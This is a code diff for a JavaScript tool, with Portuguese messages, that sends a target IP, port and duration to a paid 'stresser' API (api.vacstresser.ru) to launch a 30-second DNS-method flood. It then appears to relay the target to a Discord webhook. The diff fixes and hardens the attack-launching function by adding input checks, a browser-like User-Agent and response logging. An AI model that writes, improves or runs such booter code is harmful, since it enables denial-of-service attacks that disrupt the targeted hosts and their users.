@@ -54,17 +54,38 @@ async function clear() {
 }
 
 async function sendApiRequest(ip) {
-    const url = `https://api.vacstresser.ru/api?key=${token}&host=${ip}&port=80&time=30&method=DNS`;
+    if (!token || token.trim() === '') {
+        console.error('Token inválido. Por favor, forneça um token válido.');
+        return;
+    }
+
+    if (!ip || ip.trim() === '') {
+        console.error('IP inválido. Por favor, forneça um IP válido.');
+        return;
+    }
+
+    const url = `https://api.vacstresser.ru/api?key=${token}&ip=${ip}&port=80&time=30&method=DNS`;
     console.log(`URL da API: ${url}`);
-    const response = await axios.get(url);
-    
+
     try {
-        await axios.all(requests);
-        console.log(`Requisição enviada para o IP: ${ip}`);
+        const response = await fetch(url, {
+            method: 'GET',
+            headers: {
+                'User-Agent': 'Mozilla/5.0'
+            }
+        });
+
+        if (!response.ok) {
+            throw new Error(`Erro HTTP! Status: ${response.status}`);
+        }
+
+        const data = await response.json();
+        console.log('Resposta da API:', data);
     } catch (error) {
-        console.error('Erro completo:', error);
+        console.error('Erro ao enviar requisição:', error.message);
     }
 }
+
 
 async function sendDiscordWebhooks(ip) {
     const webhook2 = axios.post(discordWebhookUrl, {
